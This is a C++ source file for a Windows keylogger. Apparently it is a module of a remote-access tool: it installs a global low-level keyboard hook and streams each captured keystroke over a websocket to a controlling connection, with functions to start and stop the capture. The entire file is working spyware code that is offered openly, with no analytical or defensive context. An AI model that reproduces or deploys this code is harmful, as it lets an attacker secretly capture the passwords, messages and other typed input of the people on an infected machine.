#include "keylogger.h"

static HHOOK g_keyboardHook = NULL;
static std::shared_ptr<websocket::stream<tcp::socket>> g_ws_ptr;
static DWORD g_keyloggerThreadId = 0;

void logKeystroke(int key) {
    try {
        if (!g_keylogger.load() || !g_ws_ptr) return;
        if (key == VK_BACK) 
            sendMsg(*g_ws_ptr, "text", "Keylogger", "[BACKSPACE]");
        else if (key == VK_RETURN) 
            sendMsg(*g_ws_ptr, "text", "Keylogger", "[ENTER]\n");
        else if (key == VK_SPACE) 
            sendMsg(*g_ws_ptr, "text", "Keylogger", "[SPACE]");
        else if (key == VK_TAB) 
            sendMsg(*g_ws_ptr, "text", "Keylogger", "[TAB]");
        else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT) 
            sendMsg(*g_ws_ptr, "text", "Keylogger", "[SHIFT]");
        else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL) 
            sendMsg(*g_ws_ptr, "text", "Keylogger", "[CTRL]");
        else if (key == VK_MENU || key == VK_LMENU || key == VK_RMENU) 
            sendMsg(*g_ws_ptr, "text", "Keylogger", "[ALT]");
        else if (key >= 'A' && key <= 'Z') {
            bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
            sendMsg(*g_ws_ptr, "text", "Keylogger", std::string(1, shiftPressed ? key : key + ' '));
        } else if (key >= '0' && key <= '9') 
            sendMsg(*g_ws_ptr, "text", "Keylogger", std::string(1, static_cast<char>(key)));
        else if (key >= VK_F1 && key <= VK_F12) 
            sendMsg(*g_ws_ptr, "text", "Keylogger", "[F" + std::to_string(key - VK_F1 + 1) + "]");
        else 
            sendMsg(*g_ws_ptr, "text", "Keylogger", "[" + std::to_string(key) + "]");
    } catch (const std::exception& e) {
        file_logger->error("Keylogger exception: {}", e.what());
        if (g_keyloggerThreadId != 0) 
            PostThreadMessage(g_keyloggerThreadId, WM_QUIT, 0, 0);
    }
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && g_keylogger.load() && g_ws_ptr != nullptr) {
        KBDLLHOOKSTRUCT* pKeyboard = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) 
            logKeystroke(pKeyboard->vkCode);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void key_log_start(std::shared_ptr<websocket::stream<tcp::socket>> ws_ptr) {
    std::lock_guard<std::mutex> lock(g_control_mutex);
    if (g_keylogger.load()) { 
        try {
            sendMsg(*ws_ptr, "text", "Info", "Keylogger is already running.");
            file_logger->info("Keylogger is already running.");
        } catch (...) {} 
        return;
    }
    
    g_keylogger = true; 
    g_ws_ptr = ws_ptr;  

    keylogger_thread = std::thread([ws_ptr]() {
        g_keyloggerThreadId = GetCurrentThreadId();
        g_keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
        if (g_keyboardHook == NULL) {
            try {
                sendMsg(*ws_ptr, "text", "Error", "Failed to install keyboard hook!");
                file_logger->error("Failed to install keyboard hook for keylogger.");
            } catch (...) {}
            g_keylogger = false;
            return;
        }
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        UnhookWindowsHookEx(g_keyboardHook);
        g_keyboardHook = NULL; 
        g_keyloggerThreadId = 0;
        file_logger->info("Keylogger thread stopped.");
    });
}

void key_log_stop() {
    std::lock_guard<std::mutex> lock(g_control_mutex);
    if (!g_keylogger.load()) 
        return;
    
    g_keylogger = false; 
    if (g_keyboardHook != NULL) {
        UnhookWindowsHookEx(g_keyboardHook);
        g_keyboardHook = NULL;
    }

    if (g_keyloggerThreadId != 0) 
        PostThreadMessage(g_keyloggerThreadId, WM_QUIT, 0, 0);

    std::thread temp_thread = std::move(keylogger_thread);
    std::thread([t = std::move(temp_thread)]() mutable {
        try {
            if (t.joinable()) {
                t.join();
                file_logger->info("Reaper: Keylogger thread joined.");
            }
        } catch (const std::exception& e) {
            file_logger->error("Reaper: Exception caught joining keylogger thread: {}", e.what());
        } catch (...) {
            file_logger->error("Reaper: Unknown exception caught joining keylogger thread.");
        }
    }).detach();
    g_keyloggerThreadId = 0; 
    g_ws_ptr.reset(); 
}